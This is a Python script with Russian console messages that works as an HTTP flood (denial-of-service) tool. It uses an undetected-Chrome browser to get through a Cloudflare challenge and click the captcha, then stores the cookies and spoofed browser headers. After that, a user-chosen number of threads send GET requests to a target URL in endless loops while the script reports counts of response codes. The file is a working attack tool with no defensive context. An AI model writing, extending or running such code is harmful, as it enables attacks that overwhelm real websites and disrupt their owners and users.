#from pyvirtualdisplay import Display
from seleniumbase import Driver
import requests
from threading import Thread
import sys
import time
import json
st = {}
url = sys.argv[1]
thread_count = int(sys.argv[2])
try: 
    h3 = sys.argv[3]
except:
    h3 = None 
try:
    file = json.load(open(f'saves/{url.split('/')[2]}.json', 'r'))
except:
    if h3 != "--no-captcha":
        file = False
    else:
        file = True
if h3 == "--update-cookies" or not file:
    print('Обход...')
    #disp = Display(visible=True, size=(1366, 768), backend="xvfb", use_xauth=True)
    #disp.start()
    driver = Driver(uc=True, headless=False)
    driver.uc_open_with_reconnect(url, reconnect_time=6)
    driver.uc_gui_click_captcha()
    cookies = driver.get_cookies()
    driver.save_screenshot("cloudflare-challenge.png")
    user_agent = driver.execute_script("return navigator.userAgent")
    headers = {'Host': url.split('/')[2], 'Accept-Encoding': 'gzip, br', 'Accept-Language': 'en-US,en;q=0.9', 'Referer': url, 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Connection': 'Keep-Alive', 'Sec-Fetch-Site': 'same-origin', 'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Full-Version': '"131.0.6778.204"', 'Sec-Ch-Ua-Arch': '"x86"', 'Sec-Ch-Ua-Platform': '"Linux"', 'Sec-Ch-Ua-Platform-Version': '"6.5.0"', 'Sec-Ch-Ua-Model': '""', 'Sec-Ch-Ua-Bitness': '"64"', 'Sec-Ch-Ua-Full-Version-List': '"Google Chrome";v="131.0.6778.204", "Chromium";v="131.0.6778.204", "Not_A Brand";v="24.0.0.0"', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'}
    session = requests.Session()
    allcookies = {}
    for cookie in cookies:
        allcookies[cookie['name']] = cookie['value']
        session.cookies.set(cookie['name'], cookie['value'])
    dat = {
        "cookies": allcookies,
        "headers": headers
    }
    json.dump(dat, open(f'saves/{url.split('/')[2]}.json', 'w'))
else:
    if h3 != "--no-captcha":
        print('Cookie найдены и не указан флаг --update-cookies')
        session = requests.Session()
        headers = file['headers']
        for cookie_name, cookie_value in file['cookies'].items():
            session.cookies.set(cookie_name, cookie_value)
    else:
        session = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
def bum():
    global st
    while True:
        try:
            response = session.get(url, headers=headers)
            status_code = response.status_code
            if str(status_code) not in st:
                st[str(status_code)] = 0
            st[str(status_code)] += 1
        except Exception as e:
            print(f"Ошибка: {e}")
def update():
    while True:
        print(st, end='\r')
        time.sleep(1)
Thread(target=update, daemon=True).start()
for _ in range(thread_count):
    Thread(target=bum, daemon=True).start()
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Завершение работы.")
    #disp.stop()
    driver.quit()